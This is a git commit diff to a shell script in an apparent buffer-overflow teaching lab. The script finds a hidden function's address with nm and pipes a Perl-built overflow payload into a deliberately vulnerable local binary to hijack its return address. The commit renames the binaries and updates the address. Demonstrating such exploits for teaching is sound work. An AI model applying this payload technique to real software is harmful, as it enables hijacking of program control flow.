236ccaf73d8c1760df199858eb80a2af6ef108de
Kaiwan N Billimoria <kaiwan.billimoria@gmail.com>
2021-10-05 13:51:37 +0530

    it's not ARM-specific...

--- code/arm_bof_poc/secretfunc_try2.sh
+++ code/arm_bof_poc/secretfunc_try2.sh
@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # Find &secret_func
-# $ nm ./arm_bof_vuln |grep secret
+# $ nm ./bof_vuln |grep secret
 # 000104c4 t secret_func
 ## 0000067c t secret_func
 
-perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ./arm_bof_vuln_reg
-#perl -e 'print "A"x12 . "B"x4 . "\x7c\x06\x00\x00"' | ./arm_bof_vuln_reg
+perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ./bof_vuln_lessprot
+#perl -e 'print "A"x12 . "B"x4 . "\x7c\x06\x00\x00"' | ./bof_vuln_reg
